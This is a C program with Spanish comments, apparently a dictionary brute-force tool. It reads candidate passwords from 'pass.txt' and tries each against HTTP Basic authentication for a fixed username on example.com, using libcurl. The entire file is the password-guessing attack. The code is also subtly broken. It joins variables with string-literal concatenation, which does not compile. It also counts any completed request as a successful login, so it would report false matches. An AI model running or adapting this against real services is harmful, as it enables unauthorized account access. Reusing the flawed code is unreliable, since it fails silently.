#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Prototipo de la función login
int login(const char *url, const char *username, const char *password);

int main() {
    // Abre el archivo "pass.txt" para leer las contraseñas
    FILE *fp = fopen("pass.txt", "r");
    if (fp == NULL) {
        printf("No se pudo abrir el archivo 'pass.txt'.\n");
        exit(1);
    }

    // Lee cada línea del archivo
    char line[1024];
    while (fgets(line, sizeof(line), fp) != NULL) {
        // Elimina el salto de línea del final de la línea
        line[strlen(line) - 1] = '\0';

        // Intenta iniciar sesión con la contraseña actual
        int success = login("http://example.com", "username", line);

        // Imprime el resultado del intento de inicio de sesión
        if (success) {
            printf("La contraseña '%s' es correcta.\n", line);
            break;
        } else {
            printf("La contraseña '%s' es incorrecta.\n", line);
        }
    }

    // Cierra el archivo
    fclose(fp);

    return 0;
}

// Función para iniciar sesión en una página HTTP
int login(const char *url, const char *username, const char *password) {
    // Crea una solicitud HTTP
    CURL *curl = curl_easy_init();
    if (curl == NULL) {
        return 0;
    }

    // Configura la solicitud HTTP
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERPWD, username ":" password);
    curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);

    // Realiza la solicitud HTTP
    CURLcode res = curl_easy_perform(curl);

    // Limpia y cierra la sesión cURL
    curl_easy_cleanup(curl);

    return res == CURLE_OK;
}

